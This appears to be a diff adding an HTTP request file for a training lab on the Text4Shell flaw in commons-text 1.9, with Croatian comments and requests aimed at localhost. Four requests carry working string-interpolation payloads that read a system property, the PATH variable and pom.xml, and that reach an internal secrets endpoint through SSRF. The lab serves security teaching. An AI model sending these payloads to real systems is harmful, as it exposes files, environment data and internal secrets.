@@ -1,0 +1,33 @@
+### Lab05 – Software Supply Chain (commons-text Text4Shell)
+@host = http://localhost:8080
+
+### 1. Obican pozdrav (radi uvijek)
+POST {{host}}/api/lab05/greeting
+Content-Type: application/json
+
+{"name": "Ana"}
+
+### 2. EKSPLOATACIJA: interpolacija sistemskog svojstva
+# Ranjivo (main, commons-text 1.9): vraca stvarnu vrijednost. Popravljeno: doslovni tekst.
+POST {{host}}/api/lab05/greeting
+Content-Type: application/json
+
+{"name": "${sys:java.version}"}
+
+### 3. EKSPLOATACIJA: varijabla okoline
+POST {{host}}/api/lab05/greeting
+Content-Type: application/json
+
+{"name": "${env:PATH}"}
+
+### 4. EKSPLOATACIJA: citanje datoteke
+POST {{host}}/api/lab05/greeting
+Content-Type: application/json
+
+{"name": "${file:UTF-8:pom.xml}"}
+
+### 5. EKSPLOATACIJA: SSRF kroz url lookup (spoj s lab03 metom)
+POST {{host}}/api/lab05/greeting
+Content-Type: application/json
+
+{"name": "${url:UTF-8:http://127.0.0.1:8080/internal/admin/secrets}"}
